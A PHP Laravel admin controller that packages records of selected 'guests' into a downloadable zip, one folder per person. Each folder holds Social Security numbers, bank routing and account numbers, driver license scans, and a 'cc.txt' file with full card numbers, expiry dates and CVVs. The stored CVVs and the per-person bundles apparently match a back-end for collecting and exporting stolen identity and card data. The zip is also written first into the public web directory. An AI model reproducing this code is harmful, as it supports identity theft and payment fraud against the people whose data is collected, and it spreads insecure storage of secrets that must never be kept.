<?php

namespace App\Http\Controllers\Admin\Dashboard;

use App\Http\Controllers\Controller;
use App\Models\Guest;
use Illuminate\Http\Request;
use ZipArchive;

class DownloadController extends Controller
{
    public function __invoke(Request $request)
    {
        $selectedGuestIds = $request->input('selected_guests', []);

        $zip = new ZipArchive;
        $zipFileName = 'guests_data.zip';
        $zipFilePath = public_path($zipFileName);

        // Удаление старого файла
        if (file_exists($zipFilePath)) {
            unlink($zipFilePath);
        }

        if ($zip->open($zipFilePath, ZipArchive::CREATE) === TRUE) {
            foreach ($selectedGuestIds as $guestId) {
                $guest = Guest::with(['bank', 'documents'])->find($guestId);

                if ($guest) {
                    $folderName = "{$guest->name} - {$guest->state}";
                    $zip->addEmptyDir($folderName);

                    // Add data.txt
                    $dataTxtContent = "Name: {$guest->name}\n"
                        . "Birth Date: {$guest->date_of_birth}\n"
                        . "Email: {$guest->email}\n"
                        . "Cell Phone: {$guest->cell_phone}\n"
                        . "Work Phone: {$guest->work_phone}\n"
                        . "Social Number: {$guest->social_number}\n"
                        . "Driver License Number: " . ($guest->documents->driving_number ?? 'N/A') . "\n"
                        . "Military Service: {$guest->military_service}\n"
                        . "Home Zip Code: {$guest->zip_code}\n"
                        . "Street: {$guest->address}\n"
                        . "City: {$guest->city}\n"
                        . "State: {$guest->state}\n"
                        . "Country: {$guest->country}\n"
                        . "Years At Address: {$guest->address_years}\n"
                        . "Residential Status: {$guest->residential_status}\n"
                        . "Bank Name: " . ($guest->bank->bank_name ?? 'N/A') . "\n"
                        . "Routing Number: " . ($guest->bank->routing_number ?? 'N/A') . "\n"
                        . "Account Number: " . ($guest->bank->account_number ?? 'N/A') . "\n"
                        . "Bank Years: " . ($guest->bank->bank_year ?? 'N/A') . "\n"
                        . "Employment Status: \n"
                        . "Job Title: \n"
                        . "Employer Name: \n"
                        . "Employment Status Length: \n"
                        . "Payment Type: \n"
                        . "How Often Get Paid: \n"
                        . "Salary: " . ($guest->job_info->salary ?? 'N/A') . "\n";
                    $zip->addFromString("$folderName/data.txt", $dataTxtContent);

                    // Add cc.txt
                    if ($guest->bank) {
                        $ccTxtContent = "Credit Card: {$guest->bank->card_number}\n"
                            . "Expire Date: {$guest->bank->expiration_date}\n"
                            . "CVV: {$guest->bank->cvv}\n"
                            . "Street: {$guest->address}\n"
                            . "City: {$guest->city}\n"
                            . "State: {$guest->state}\n"
                            . "Zip Code: {$guest->zip_code}\n"
                            . "Email: {$guest->email}\n"
                            . "Cell Phone: {$guest->cell_phone}\n"
                            . "Birth Date: {$guest->date_of_birth}\n"
                            . "Social Number: {$guest->social_number}\n"
                            . "Driver License Number: " . ($guest->documents->driving_number ?? 'N/A') . "\n";
                        $zip->addFromString("$folderName/cc.txt", $ccTxtContent);
                    }

                    // Add images
                    if ($guest->documents) {
                        if ($guest->documents->driving_front) {
                            $zip->addFile(storage_path("app/{$guest->documents->driving_front}"), "$folderName/front.jpg");
                        }
                        if ($guest->documents->driving_back) {
                            $zip->addFile(storage_path("app/{$guest->documents->driving_back}"), "$folderName/back.jpg");
                        }
                    }
                }
            }

            $zip->close();
        }

        if (file_exists($zipFilePath)) {
            return response()->download($zipFilePath)->deleteFileAfterSend(true);
        } else {
            return redirect()->back()->with('error', 'Could not create zip file.');
        }
    }
}
